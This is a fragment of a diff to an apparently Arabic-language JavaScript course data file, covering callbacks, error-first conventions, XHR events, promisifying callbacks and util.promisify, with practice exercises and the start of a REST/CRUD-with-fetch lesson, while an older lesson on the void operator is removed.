+3. الكود خلص، والـ callbacks لسه مستنية
+4. الـ timer خلص
+6. خطأ: ENOENT undefined
+5. الملف: متجر النور
+~~~
+
+**[[setTimeout(fn, 0)]]** معناها «شغّل [[fn]] بعد صفر ms على الأقل»، بس مش دلوقتي: بعد ما الكود الحالي يخلص. عشان كده ٤ بعد ٣.
+
+**الـ error-first callback** (اتفاق Node): أول argument دايمًا الخطأ ([[null]] لو مفيش)، والتاني النتيجة. فالـ callback لازم يبدأ بـ [[if (err) return ...]]. لما الملف مش موجود: [[err.code]] = [["ENOENT"]] (Error NO ENTry) و [[text]] = [[undefined]].
+
+**الترتيب بين ٥ و ٦ مش مضمون:** العمليتين اتبعتوا مع بعض، واللي يخلص الأول callback بتاعه يتنده الأول.
+
+---
+
+## ٢. الأحداث: نفس الفكرة بس ممكن تتكرر
+
+**[[XMLHttpRequest]]** (XHR) هو اللي كان بيعمل الطلبات قبل [[fetch]]:
+
+~~~js xhr.js (في صفحة)
+const xhr = new XMLHttpRequest();
+xhr.open("GET", "shop.json");
+xhr.responseType = "json";
+xhr.addEventListener("load", () => console.log("XHR load:", xhr.status, xhr.response.name));
+xhr.addEventListener("error", () => console.log("XHR error"));
+xhr.addEventListener("loadend", () => console.log("XHR loadend"));
+xhr.send();
+console.log("XHR اتبعت، والكود كمّل");
+~~~
+
+~~~text الناتج (Chrome 157)
+XHR اتبعت، والكود كمّل
+XHR load: 200 متجر النور
+XHR loadend
+~~~
+
+- [[load]] بيتنده لأي رد من السيرفر، **حتى 404**. انت اللي تفحص [[xhr.status]]. و [[error]] للشبكة بس (زي [[fetch]] بالظبط: درس «fetch و AbortController»).
+- [[loadend]] بعد النجاح أو الفشل، زي [[finally]].
+- فيه كمان [[progress]] (نسبة التحميل) و [[timeout]] و [[abort]]. [[progress]] للـ upload هو السبب الوحيد اللي ممكن يخليك تستخدم XHR النهارده (درس «drag and drop و progress»).
+
+وفي Node، [[EventEmitter]] (درس «EventEmitter») بنفس الفكرة: [[stream.on("data", ...)]] و [[server.on("request", ...)]].
+
+---
+
+## ٣. المشاكل اللي خلّت Promise يتعمل
+
+**أ. callback hell:** ٣ خطوات ورا بعض = ٣ مستويات جوه بعض، وفحص خطأ في كل مستوى:
+
+~~~js hell.js
+const fs = require("node:fs");
+fs.readFile("shop.json", "utf8", (err, text) => {
+  if (err) return console.log("فشل ١:", err.code);
+  const shop = JSON.parse(text);
+  fs.writeFile("report.txt", shop.name + ": " + shop.orders + " طلبات\n", err => {
+    if (err) return console.log("فشل ٢:", err.code);
+    fs.readFile("report.txt", "utf8", (err, report) => {
+      if (err) return console.log("فشل ٣:", err.code);
+      console.log("التقرير:", report.trim());
+    });
+  });
+});
+~~~
+
+~~~text الناتج
+التقرير: متجر النور: 3 طلبات
+~~~
+
+ونفس الخطوات بـ [[fs/promises]] و [[await]]: سطر لكل خطوة، و [[catch]] واحد:
+
+~~~js flat.js
+const fs = require("node:fs/promises");
+async function main() {
+  const shop = JSON.parse(await fs.readFile("shop.json", "utf8"));
+  await fs.writeFile("report.txt", shop.name + ": " + shop.orders + " طلبات\n");
+  console.log("التقرير:", (await fs.readFile("report.txt", "utf8")).trim());
+}
+main().catch(err => console.log("فشل:", err.code));
+~~~
+
+~~~text الناتج
+التقرير: متجر النور: 3 طلبات
+~~~
+
+وفيه مشكلة في [[hell.js]] مش باينة: لو [[JSON.parse]] رمت، محدش هيمسكها (مش جوه [[if (err)]])، والبرنامج يقع. في [[flat.js]] الـ [[catch]] بيمسك الاتنين.
+
+**ب. inversion of control:** انت سلّمت الـ function بتاعتك لكود تاني، وهو اللي يقرر يناديها إمتى وكام مرة:
+
+~~~js twice.js
+function badRead(cb) { cb(null, "أول"); cb(null, "تاني"); }
+badRead((err, v) => console.log("callback:", v));
+new Promise(resolve => badRead((e, v) => resolve(v))).then(v => console.log("promise:", v));
+~~~
+
+~~~text الناتج
+callback: أول
+callback: تاني
+promise: أول
+~~~
+
+الـ callback اتنده مرتين (تخيّل ده بيدفع فلوس). الـ Promise اتحلّت مرة واحدة: أي [[resolve]] بعد الأولى بتتجاهل. ده ضمان مبني جوه Promise.
+
+**ج. مرة sync ومرة async:** callback بيتنده على طول لو الداتا في الكاش، وبعدين لو من الشبكة:
+
+~~~text الناتج: «قبل» ثم كاش ثم شبكة ثم «بعد»
+قبل
+من الكاش
+بعد
+من الشبكة
+~~~
+
+الكود اللي بعد النداء مش عارف هيشتغل قبل الـ callback ولا بعده. Promise بيحل ده: [[.then]] دايمًا بيتنده async (microtask) حتى لو الـ Promise محلولة خلاص.
+
+---
+
+## ٤. لفّ callback في Promise
+
+القاعدة: [[new Promise((resolve, reject) => { ... })]]، وجواها نادي الـ API القديم، وفي الـ callback بتاعه نادي [[resolve(value)]] أو [[reject(err)]]:
+
+~~~js read-json.js
+function readJson(path) {
+  return new Promise((resolve, reject) => {
+    fs.readFile(path, "utf8", (err, text) => {
+      if (err) return reject(err);
+      try { resolve(JSON.parse(text)); } catch (e) { reject(e); }
+    });
+  });
+}
+~~~
+
+~~~text الناتج: await readJson("shop.json") ثم readJson("missing.json")
+{ name: 'متجر النور', orders: 3 }
+ENOENT
+~~~
+
+ونفس الحكاية للأحداث في المتصفح: الصورة.
+
+~~~js load-image.js
+function loadImage(src) {
+  return new Promise((resolve, reject) => {
+    const img = new Image();
+    img.onload = () => resolve(img);
+    img.onerror = () => reject(new Error("الصورة مش موجودة: " + src));
+    img.src = src;
+  });
+}
+~~~
+
+~~~text الناتج (Chrome 157)
+loadImage: 40 40
+loadImage: الصورة مش موجودة: nope.png
+~~~
+
+لاحظ إن [[onload]] اتعيّن **قبل** [[src]]: لو الصورة في الكاش ممكن تخلص بسرعة جدًا. (والمتصفحات الجديدة فيها [[await img.decode()]] جاهزة.) وهنا الـ handler property مقبولة لأن الـ [[Image]] ده بتاعنا لوحدنا (الدرس اللي فات).
+
+---
+
+## ٥. [[util.promisify]]: اللف الجاهز في Node
+
+أي function آخر argument فيها error-first callback، [[util.promisify]] بيرجّعلك نسخة بترجّع Promise:
+
+~~~js promisify.js
+const fs = require("node:fs");
+const { promisify } = require("node:util");
+const readFile = promisify(fs.readFile);
+const wait = promisify(setTimeout);
+readFile("shop.json", "utf8").then(text => console.log(text.length, "حرف"));
+wait(50, "خلص").then(console.log);
+~~~
+
+~~~text الناتج (node promisify.js)
+32 حرف
+خلص
+~~~
+
+- [[promisify(setTimeout)]] اشتغلت مع إن [[setTimeout]] الـ callback بتاعها أول argument مش آخر واحد. السبب: Node حاطط عليها نسخة جاهزة في [[setTimeout[util.promisify.custom]]] (اتقاس: [["function"]]). لو عملت promisify بإيدك على [[setTimeout]] هتاخد [[ERR_INVALID_ARG_TYPE]] (تمرين ٢).
+- [[promisify(5)]] بيرمي [[TypeError: The "original" argument must be of type function. Received type number (5)]].
+- العكس موجود: [[util.callbackify(asyncFn)]] لو مكتبة قديمة عايزة callback.
+- **النهارده:** كل حاجة في Node ليها نسخة Promise جاهزة: [[node:fs/promises]] و [[node:timers/promises]] و [[node:stream/promises]] و [[node:dns/promises]]. [[promisify]] لمكتباتك القديمة بس.
+- **للأحداث:** [[const [dish] = await once(oven, "ready")]] من [[node:events]] بتستنى أول مرة الحدث يحصل (اتقاس: [[await once: كيكة]]).
+
+---
+
+## الخلاصة
+
+| عندك | اعمل |
+|---|---|
+| API بـ error-first callback في Node | النسخة [[/promises]]، أو [[util.promisify]] |
+| API قديم بـ callback أو حدث ([[onload]]) | [[new Promise((resolve, reject) => ...)]] حواليه |
+| حدث بيحصل مرة وعايز تستناه | [[events.once]] في Node، أو [[{ once: true }]] جوه Promise |
+| حدث بيتكرر ([[progress]]، [[message]]) | خليه listener عادي: Promise بتتحل مرة واحدة بس |
+
+اللي ميتلخبطش: [[return]] قبل أي callback للخطأ، والترتيب بين عمليتين async مش مضمون، والـ Promise بتتحل مرة واحدة ودايمًا async.`,
+          lines: [
+            R`موديول الملفات في Node، بنسخة الـ callbacks`,
+            R`كود عادي: بيتنفّذ على طول`,
+            R`[[setTimeout]] بـ ٠: الـ callback بيستنى لحد ما الكود الحالي يخلص`,
+            R`قراية ملف: Node بيقراه في الخلفية وينادي الـ callback بـ [[(err, text)]] لما يخلص`,
+            R`error-first: لو فيه خطأ اطبعه و [[return]] عشان منكمّلش بـ [[text]] فاضي`,
+            R`مفيش خطأ: [[text]] فيه محتوى الملف كنص`,
+            R`قفلة الـ callback`,
+            R`قراية ملف مش موجود: الـ callback هيتنده بـ [[err]]`,
+            R`الملف مش موجود: [[err.code]] = [["ENOENT"]] و [[text]] = [[undefined]]، فبنطبعهم ونرجع`,
+            R`قفلة الـ callback التاني`,
+            R`كود عادي: بيتنفّذ قبل أي callback`,
+            R`آخر سطر في الملف: بعده البرنامج بيستنى الـ callbacks اللي لسه متندهتش`,
+          ],
+          practice: [
+            { lvl: 'سريع', t: R`**اقرا وتوقّع:** [[console.log("A")]] ثم [[setTimeout(() => console.log("B"), 0)]] ثم [[Promise.resolve().then(() => console.log("C"))]] ثم [[fs.readFile(__filename, () => console.log("D"))]] ثم [[console.log("E")]]. اكتب الترتيب قبل ما تشغّل في Node (من قسم ١ في الشرح ودرس «microtasks و macrotasks»).`, done: R`«A E C B D»، وعارف ليه C قبل B (microtask) وليه D آخر واحد.`, sol: R`~~~js order.js
+console.log("A");
+setTimeout(() => console.log("B"), 0);
+Promise.resolve().then(() => console.log("C"));
+require("node:fs").readFile(__filename, () => console.log("D"));
+console.log("E");
+~~~
+
+~~~text الناتج (node order.js، Node 24.22)
+A
+E
+C
+B
+D
+~~~
+
+- **A و E:** كود عادي.
+- **C:** الـ [[.then]] microtask، بيتنفّذ أول ما الكود الحالي يخلص وقبل أي timer.
+- **B:** callback الـ timer، في أول دورة للـ event loop.
+- **D:** قراية الملف بتاخد وقت فعلي (فتح وقراية)، فبتخلص بعد الـ timer. ده «غالبًا» مش «دايمًا»، بس على أي جهاز عادي بيطلع كده.` },
+            { lvl: 'تطبيق', t: R`**ابني:** [[toPromise(fn)]] بإيدك: بترجّع function بتاخد نفس الـ arguments وترجّع Promise، وبتحط في الآخر callback [[(err, value)]] بيعمل [[reject]] أو [[resolve]]. جرّبها على [[fs.stat]] لملف موجود وملف مش موجود، وقارنها بـ [[util.promisify]]. وبعدين جرّبها على [[setTimeout]]: إيه اللي حصل وليه [[util.promisify(setTimeout)]] شغالة؟ (من قسمي ٤ و ٥ في الشرح).`, done: R`[[stat]] رجّع الحجم ورفض بـ [[ENOENT]]، والنتيجة زي [[util.promisify]]، و [[toPromise(setTimeout)]] رفضت بـ [[ERR_INVALID_ARG_TYPE]] وعرفت السبب.`, sol: R`~~~js my-promisify.js
+// my-promisify.js: promisify بإيدك لأي دالة آخر argument فيها callback (err, value)
+const fs = require("node:fs");
+const util = require("node:util");
+
+function toPromise(fn) {
+  return (...args) =>
+    new Promise((resolve, reject) => {
+      fn(...args, (err, value) => (err ? reject(err) : resolve(value)));
+    });
+}
+
+const stat = toPromise(fs.stat);
+(async () => {
+  const s = await stat("shop.json");
+  console.log("حجم:", s.size, "بايت");
+  try { await stat("missing.json"); } catch (e) { console.log("خطأ:", e.code); }
+  const s2 = await util.promisify(fs.stat)("shop.json");
+  console.log("util.promisify:", s2.size === s.size);
+  const wait = util.promisify(setTimeout);
+  console.log("wait:", await wait(20, "خلصت"));
+  const myWait = toPromise(setTimeout);
+  await myWait(10).catch(e => console.log("toPromise(setTimeout):", e.code));
+  console.log("custom:", typeof setTimeout[util.promisify.custom]);
+})();
+~~~
+
+~~~text الناتج (node my-promisify.js، Node 24.22)
+حجم: 41 بايت
+خطأ: ENOENT
+util.promisify: true
+wait: خلصت
+toPromise(setTimeout): ERR_INVALID_ARG_TYPE
+custom: function
+~~~
+
+- **[[(...args)]]** بيلم كل الـ arguments، و [[fn(...args, callback)]] بيحط الـ callback في الآخر.
+- **٤١ بايت** والملف ٣٢ حرف: الحروف العربي بايتين في UTF-8.
+- **[[setTimeout(10, callback)]]:** أول argument لازم function، فـ Node رمى [[ERR_INVALID_ARG_TYPE]] جوه الـ executor، والـ Promise اترفضت بيه. [[util.promisify]] بيدوّر الأول على [[fn[util.promisify.custom]]]، و Node حاطط هناك نسخة صح لـ [[setTimeout]].` },
+            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[readConfig(cb)]] بتقرا [[config.json]] بـ [[fs.readFile]]، وجوه الـ callback: [[if (err) cb(err); cb(null, JSON.parse(text));]]. شغّلها والملف مش موجود. إيه اللي اتطبع والبرنامج عمل إيه؟ صلّحها، وخليها كمان متقعش لو الـ JSON بايظ (من قسم ٣ في الشرح).`, done: R`النسخة البايظة طبعت «مفيش config» ووقعت بـ [[SyntaxError]]، والمصلّحة بتطبع رسالة واحدة في الحالات التلاتة: مش موجود، و JSON بايظ، وسليم.`, sol: R`~~~js bug.js
+const fs = require("node:fs");
+function readConfig(cb) {
+  fs.readFile("config.json", "utf8", (err, text) => {
+    if (err) cb(err);
+    cb(null, JSON.parse(text));
+  });
+}
+readConfig((err, config) => {
+  if (err) return console.log("مفيش config:", err.code);
+  console.log("config:", config);
+});
+~~~
+
+~~~text الناتج (node bug.js، Node 24.22، ومسار الملف في الـ stack اتشال)
+مفيش config: ENOENT
+<anonymous_script>:1
+undefined
+^
+
+SyntaxError: "undefined" is not valid JSON
+    at JSON.parse (<anonymous>)
+    at ReadFileContext.callback (.../bug.js:5:19)
+    at FSReqCallback.readFileAfterOpen [as oncomplete] (node:fs:300:13)
 
 Node.js v24.22.1
-exit 1
 ~~~
 
-[[still alive?]] **متطبعتش**: الـ Promise اترفضت ومحدش مسكها، فـ Node (من النسخة 15) بيعامل الـ unhandled rejection كـ crash ويخرج بـ 1. يعني [[void]] قال «مش هستنى» بس **مقالش** «ومش مهتم لو فشلت».
-
-~~~js fire-fixed.cjs
-const save = async () => { throw new Error('disk full'); };
-void save().catch((e) => console.error('save failed:', e.message));
-setTimeout(() => console.log('still alive?'), 20);
-~~~
-
-~~~text الناتج (Node 24.22)
-save failed: disk full
-still alive?
-~~~
-
-القاعدة: [[void promise]] لوحدها مقبولة بس لو الدالة نفسها بتمسك أخطاءها جواها. وإلا [[void p.catch(handler)]]. (درس «الأخطاء العامة: unhandledrejection و uncaughtException».)`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** اكتب الـ ٦ قيم قبل التشغيل:
-
-~~~js
-console.log(void 2 + 3, void (2 + 3), typeof void 0, void 0 === undefined, [void 0].length, void [1, 2].push(3));
-~~~`, done: R`كتبت [[NaN undefined undefined true 1 undefined]] قبل التشغيل، وتقدر تقول ليه الأولى [[NaN]].`, sol: R`~~~text الناتج (Node 24.22)
-NaN undefined undefined true 1 undefined
-~~~
-
-- [[void 2 + 3]]: [[void]] unary operator، أولويته أعلى من [[+]]، فاتقرت [[(void 2) + 3]] = [[undefined + 3]] = [[NaN]].
-- [[void (2 + 3)]]: الأقواس خلّت الجمع يحصل الأول، وبعدين اترمى: [[undefined]].
-- [[typeof void 0]]: [[typeof]] و [[void]] الاتنين unary بنفس الأولوية من اليمين للشمال، فـ [[typeof (void 0)]] = [['undefined']].
-- [[[void 0].length]]: array فيها عنصر واحد قيمته [[undefined]]، طولها 1.
-- [[void [1, 2].push(3)]]: الـ [[push]] **اشتغل** فعلًا (الـ array بقت ٣ عناصر)، بس رقم الطول اللي رجع اترمى.` },
-            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** emitter صغير: لو أي handler رجّع [[false]] الـ event بيتلغي (زي أنظمة events قديمة كتير). أول handler بيحدّث flag في سطر واحد، والـ save التاني مبيحصلش. ليه؟ وصلّحه بـ [[void]].
-
-~~~js
-function createEmitter() {
-  const handlers = [];
-  return {
-    on(fn) { handlers.push(fn); },
-    emit(value) {
-      for (const fn of handlers) if (fn(value) === false) return 'cancelled';
-      return 'delivered to ' + handlers.length;
-    },
-  };
+~~~js fixed.js
+const fs = require("node:fs");
+function readConfig(cb) {
+  fs.readFile("config.json", "utf8", (err, text) => {
+    if (err) return cb(err);
+    let config;
+    try { config = JSON.parse(text); } catch (e) { return cb(e); }
+    cb(null, config);
+  });
 }
-const flags = { dirty: true };
-const bus = createEmitter();
-bus.on((v) => (flags.dirty = v.dirty));
-bus.on((v) => console.log('  saved', v.id));
-console.log(bus.emit({ id: 1, dirty: false }));
-~~~`, done: R`النسخة المصلّحة بتطبع [[saved 2]] و [[delivered to 2]]، وتقدر تقول القيمة [[false]] جت منين.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-cancelled
+readConfig((err, config) => {
+  if (err) return console.log("مفيش config:", err.code || err.message);
+  console.log("config:", config);
+});
 ~~~
 
-[[(v) => (flags.dirty = v.dirty)]] arrow بسطر واحد، فبترجّع قيمة الـ expression. والـ assignment كـ expression قيمتها القيمة اللي اتحطت: [[false]]. فالـ emitter فهم «الغي».
+~~~text الناتج: من غير ملف، ثم {"port": 3000,}، ثم {"port": 3000}
+مفيش config: ENOENT
+مفيش config: Expected double-quoted property name in JSON at position 14 (line 1 column 15)
+config: { port: 3000 }
+~~~
 
-~~~js emitter-fixed.mjs
-function createEmitter() {
-  const handlers = [];
-  return {
-    on(fn) { handlers.push(fn); },
-    emit(value) {
-      for (const fn of handlers) if (fn(value) === false) return 'cancelled';
-      return 'delivered to ' + handlers.length;
-    },
-  };
+- **من غير [[return]]** الكود كمّل لـ [[JSON.parse(undefined)]]، فالـ callback اتنده مرة بالخطأ وبعدين البرنامج وقع. الـ [[return]] قبل أي callback للخطأ عادة لازم تبقى أوتوماتيك.
+- **[[try]] حوالين [[JSON.parse]] بس** مش حوالين [[cb(null, config)]]: لو حطيت الـ [[cb]] جوه الـ try وكود اليوزر رمى خطأ، هتنادي [[cb]] تاني بالخطأ ده (callback مرتين).
+- **الفاصلة الزيادة** بعد [[3000]] مش مسموحة في JSON.` },
+            { lvl: 'تطبيق', t: R`**ابني في المتصفح:** [[loadImage(src)]] بترجّع Promise من [[onload]] و [[onerror]]. حمّل صورتين بـ [[Promise.all]] واطبع مقاساتهم، وبعدين صورة موجودة وواحدة لأ بـ [[Promise.allSettled]]. وقارن بـ [[img.decode()]] (من قسم ٤ في الشرح ودرس «Promise.all و allSettled»).`, done: R`[[all]] رجّعت المقاسين، و [[allSettled]] رجّعت واحدة [[fulfilled]] وواحدة برسالتك، و [[decode()]] رجّعت نفس المقاس.`, sol: R`~~~js images.js (في صفحة فيها dot.svg مقاسه 40×40)
+function loadImage(src) {
+  return new Promise((resolve, reject) => {
+    const img = new Image();
+    img.onload = () => resolve(img);
+    img.onerror = () => reject(new Error("الصورة مش موجودة: " + src));
+    img.src = src;
+  });
 }
-const flags = { dirty: true };
-const bus2 = createEmitter();
-bus2.on((v) => void (flags.dirty = v.dirty));
-bus2.on((v) => console.log('  saved', v.id));
-console.log(bus2.emit({ id: 2, dirty: false }));
+const imgs = await Promise.all(["dot.svg", "dot.svg?v=2"].map(loadImage));
+console.log("all:", imgs.map(i => i.naturalWidth + "x" + i.naturalHeight).join(", "));
+const results = await Promise.allSettled(["dot.svg", "nope.png"].map(loadImage));
+console.log("allSettled:", results.map(r => (r.status === "fulfilled" ? "ok " + r.value.naturalWidth : r.reason.message)).join(" | "));
+const img = new Image();
+img.src = "dot.svg";
+await img.decode();
+console.log("decode():", img.naturalWidth);
 ~~~
 
-~~~text الناتج (Node 24.22)
-  saved 2
-delivered to 2
+~~~text الناتج (Chrome 157، [[<script type="module">]] عشان الـ await برّه function)
+all: 40x40, 40x40
+allSettled: ok 40 | الصورة مش موجودة: nope.png
+decode(): 40
 ~~~
 
-**الشرح:** [[void (...)]] خلّت الـ arrow ترجّع [[undefined]] دايمًا. والأقواس حوالين الـ assignment لازمة، لأن [[void flags.dirty = v.dirty]] = [[(void flags.dirty) = ...]]: [[SyntaxError: Invalid left-hand side in assignment]]. والبديل الأوضح لو السطر طويل: جسم [[{ flags.dirty = v.dirty; }]] بأقواس معقوفة. ونفس الفخ في React: [[useEffect(() => fetchData())]] بترجّع Promise و React مستني function للتنضيف، فبيكتبوا [[useEffect(() => { fetchData(); }, [])]] أو [[() => void fetchData()]].` },
-            { lvl: 'تحدي', t: R`**اشرحها:** زميلك شاف [[void 0]] في كود minified و [[href="javascript:void(0)"]] في HTML قديم و [[void sendAnalytics()]] في كود TypeScript. اكتب له ٤ سطور: كل واحدة بتعمل إيه وليه، وأنهي فيهم تستخدمها في كود جديد.`, done: R`الـ ٤ سطور بيغطوا: [[void 0]] = [[undefined]] أقصر ومضمون، و [[javascript:void(0)]] لينك مبيروحش حتة (قديم وفيه مشاكل accessibility)، و [[void promise]] علامة fire-and-forget بس لازم معاها [[.catch]]، والاختيار في الكود الجديد.`, sol: R`**إجابة نموذجية:**
+- **[[Promise.all]]** بتفشل كلها لو صورة واحدة فشلت، فلمعرض صور استخدم [[allSettled]] واعرض اللي نجح.
+- **[[img.decode()]]** هي نسخة الـ Promise الجاهزة في المتصفحات الجديدة، وكمان بتستنى فك الصورة نفسه، فمبيحصلش «وميض» لما تحطها في الصفحة.
+- **الـ 404** بيطلع في الـ Console كمان كـ «Failed to load resource»، وده من المتصفح مش من كودك.` },
+            { lvl: 'سريع', t: R`**اشرحها:** في ٣ سطور لزميل: ليه Promise أحسن من callback، من غير ما تقول «أنضف»؟ استخدم اللي اتقاس في الدرس (من قسم ٣ في الشرح).`, done: R`٣ نقط بأمثلة حقيقية من الدرس، مش كلام عام.`, sol: R`**إجابة نموذجية:**
 
-1. [[void 0]] بيرجّع [[undefined]] دايمًا. الـ minifiers (زي terser) بيكتبوه بدل [[undefined]] لأنه ٦ حروف بدل ٩، ولأن [[undefined]] زمان (قبل ES5) كان متغير global ممكن يتغيّر، ولسه ممكن يتغطّى محليًا: [[function legacy() { var undefined = 5; return [undefined, void 0]; }]] رجّعت [[[ 5, undefined ]]] (اتجرّب). في كودك اكتب [[undefined]]: أوضح، والمحليين ده محدش بيعمله.
-2. [[href="javascript:void(0)"]]: لينك لما تدوس عليه بيقيّم [[void(0)]] = [[undefined]]، فالمتصفح مبيروحش حتة، والـ click handler بيشتغل. قديم: استخدم [[<button type="button">]] بدل لينك مش رايح حتة (keyboard و screen readers بيتعاملوا معاه صح، وCSP بيمنع [[javascript:]] URLs أصلًا).
-3. [[void sendAnalytics()]]: «أنا قاصد مستناش». [[no-floating-promises]] في typescript-eslint بيقبلها (فيه option [[ignoreVoid]] وهو [[true]] افتراضيًا حسب وثائقها). بس لو [[sendAnalytics]] بترمي، Node بيقفل (exit 1، اتجرّب في «جرّب»): اكتب [[void sendAnalytics().catch(report)]] أو خلّي الدالة تمسك أخطاءها.
-4. في كود جديد: [[void]] للـ fire-and-forget (ومعاه [[catch]]) وفي arrow callbacks اللي مش المفروض ترجّع حاجة. و [[void 0]] و [[javascript:void(0)]] سيبهم للأدوات والكود القديم.` },
+1. **الضمانات:** الـ Promise بتتحل مرة واحدة ([[badRead]] نده الـ callback مرتين، والـ Promise أخدت أول قيمة بس)، و [[.then]] دايمًا async، فمفيش كود بيشتغل مرة قبل ومرة بعد.
+2. **الأخطاء في مكان واحد:** في [[hell.js]] كل مستوى محتاج [[if (err)]]، و [[JSON.parse]] لو رمت محدش بيمسكها. في [[flat.js]] [[catch]] واحد بيمسك أي خطأ في أي خطوة.
+3. **التركيب:** Promise قيمة تقدر ترجّعها وتخزّنها وتديها لـ [[Promise.all]] و [[AbortSignal.timeout]] و [[await]]. الـ callback مبيترجّعش، فـ «استنى ٣ حاجات مع بعض» أو «اقطع بعد ٥ ثواني» بتتكتب بإيدك كل مرة.
+
+والـ callbacks لسه صح في حاجة واحدة: الأحداث اللي بتتكرر ([[progress]] و [[message]] و [[click]])، لأن Promise بتتحل مرة واحدة.` },
           ],
-          flag: "script",
+          ref: [
+            { t: "MDN Learn: Introducing asynchronous JavaScript", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Async_JS/Introducing" },
+            { t: "MDN: Callback function", url: "https://developer.mozilla.org/en-US/docs/Glossary/Callback_function" },
+            { t: "MDN: XMLHttpRequest", url: "https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" },
+            { t: "Node.js: util.promisify", url: "https://nodejs.org/api/util.html" },
+          ],
+          pre: ["js/Promise", "js/async و await", { to: "js/EventEmitter", why: R`الأحداث في Node نفس فكرة [[xhr.addEventListener]]` }, { to: "js/microtasks و macrotasks", why: R`ليه [[.then]] قبل [[setTimeout]] حتى بـ ٠` }],
           deep: {
-            why: R`[[void]] صغير بس بيحل ٣ مشاكل حقيقية: قيمة بترجع بالغلط من arrow بسطر واحد وبتغيّر سلوك الـ API (الإلغاء بـ [[false]]، أو cleanup في React)، و Promise محدش مستنيها والقارئ مش عارف ده قصد ولا نسيان، والكود اللي بتقراه من minifiers وأنظمة قديمة. وفهمه بيوضّح فكرة أعم: كل expression ليها قيمة، حتى الـ assignment و [[push]].`,
-            how: R`[[void UnaryExpression]] حسب المواصفة: قيّم الـ expression (فأي side effect بيحصل: نداء، تعديل، [[++]])، واعمل GetValue (فلو الـ reference مش موجود بيرمي [[ReferenceError]])، وبعدين ارجع [[undefined]]. أولويته زي باقي الـ unary ([[typeof]] و [[!]] و [[-]])، أعلى من أي binary operator، فـ [[void a + b]] = [[(void a) + b]].
-
-مع Promise: [[void p]] مش بيعمل [[then]] ولا [[catch]]، الـ Promise بتكمّل عادي. لو اترفضت ومفيش handler، الـ host بيطلق unhandledrejection: في Node 15+ الافتراضي [[--unhandled-rejections=throw]] (البرنامج بيقع بـ exit 1 لو مفيش [[process.on('unhandledRejection')]])، وفي المتصفح event [[unhandledrejection]] وتحذير في الـ console.
-
-و [[void function () {}()]]: الـ [[void]] خلّى [[function]] تبقى في مكان expression (مش أول الجملة)، فده IIFE من غير أقواس (درس «function expression و class expression و expression statement»).`,
-            when: R`[[() => void doSomething()]]: callbacks في APIs بتفرق معاها القيمة الراجعة (events بتتلغي بـ [[false]]، و [[useEffect]] في React، و [[Array.prototype.forEach]] مش بتفرق بس بيوضّح النية). [[void promise.catch(...)]]: تحليلات و logs وتسخين كاش، أي حاجة مش لازم تخلص قبل اللي بعدها. [[void 0]]: لو بتكتب كود لازم يشتغل في بيئة ممكن تغطّي [[undefined]] (نادر جدًا دلوقتي). ومتستخدموش عشان تخبّي نتيجة دالة مهمة: لو النتيجة مهمة، استخدمها.`,
-            mistakes: R`- [[void save()]] وتفتكر الأخطاء اتمسكت: البرنامج بيقع (exit 1).
-- [[void 2 + 3]] ومستني [[undefined]]: [[NaN]]. أقواس.
-- [[void x = 5]]: [[SyntaxError: Invalid left-hand side in assignment]]. اكتب [[void (x = 5)]].
-- تستخدم [[void]] على [[await]]: [[void await p]] بيستنى فعلًا (الـ [[await]] بيتقيّم الأول)، فمش fire-and-forget.
-- [[javascript:void(0)]] في لينكات جديدة بدل [[<button>]].
-- تفتكر [[void]] function: [[void(0)]] الأقواس هنا grouping مش نداء.`,
+            why: R`هتقابل callbacks في كل حتة: مكتبات Node قديمة، و [[setTimeout]]، و [[FileReader]]، و [[img.onload]]، و SDKs لخدمات دفع وخرائط. لازم تعرف تقراها، وتعرف تلفّها في Promise عشان باقي كودك يفضل [[await]].`,
+            how: R`الـ API بيبدأ الشغل في الخلفية (thread تاني في libuv أو في المتصفح) ويرجع على طول. لما يخلص بيحط الـ callback في طابور الـ event loop. [[new Promise]] بيديك [[resolve]] و [[reject]]، وانت بتناديهم من جوه الـ callback، والـ Promise بتتجاهل أي نداء بعد الأول.`,
+            when: R`Promise و [[await]] لأي عملية بتحصل مرة. listener أو callback للحاجات اللي بتتكرر. [[util.promisify]] أو [[new Promise]] لما المكتبة مفيهاش نسخة Promise. [[util.callbackify]] بس لو مكتبة قديمة طالبة callback منك.`,
+            mistakes: R`نسيان [[return]] بعد [[cb(err)]]. [[try]] حوالين [[cb(...)]] نفسه. الاعتماد على ترتيب عمليتين async. تعيين [[img.src]] قبل [[onload]]. Promise لحدث بيتكرر. [[promisify]] على دالة الـ callback بتاعتها مش في الآخر. خلط الأسلوبين في نفس الدالة (callback وكمان بترجّع Promise).`,
           },
-          teach: R`## الفكرة في سطر
+        },
+        {
+          cmd: "REST و CRUD بـ fetch",
+          title: "GET و POST و PUT و PATCH و DELETE: تكلّم API حقيقي، وتجيب نص وصور مش JSON بس",
+          desc: R`REST طريقة لتصميم الـ API: البيانات «resources» ليها عناوين ([[/api/items]] للستة، و [[/api/items/3]] لعنصر)، والـ HTTP method بيقول هتعمل إيه فيها. العمليات الأربعة على أي بيانات اسمها CRUD (Create و Read و Update و Delete)، وكل واحدة ليها method و status code:
+• Create: [[POST /api/items]] ← [[201 Created]] و header [[Location]].
+• Read: [[GET /api/items]] و [[GET /api/items/3]] ← [[200]]، أو [[404]].
+• Update: [[PUT]] (بدّل العنصر كله) أو [[PATCH]] (غيّر حقول بس) ← [[200]].
+• Delete: [[DELETE /api/items/3]] ← [[204 No Content]].
+• الغلط: [[400]] بيانات بايظة، و [[404]] مش موجود، و [[409]] تعارض، و [[405]] method مش مسموح.
+وبـ [[fetch]] نفسه بتجيب نص ([[res.text()]]) و JSON ([[res.json()]]) وصور وملفات ([[res.blob()]] و [[URL.createObjectURL]]).`,
+          example: R`const API = "http://localhost:3000/api/items";
+const json = { "Content-Type": "application/json" };
+const created = await (await fetch(API, { method: "POST", headers: json, body: JSON.stringify({ name: "لاتيه", price: 60 }) })).json();
+const list = await (await fetch(API)).json();
+await fetch(API + "/" + created.id, { method: "PUT", headers: json, body: JSON.stringify({ name: "لاتيه كبير", price: 70 }) });
+await fetch(API + "/" + created.id, { method: "PATCH", headers: json, body: JSON.stringify({ price: 65 }) });
+const del = await fetch(API + "/" + created.id, { method: "DELETE" });
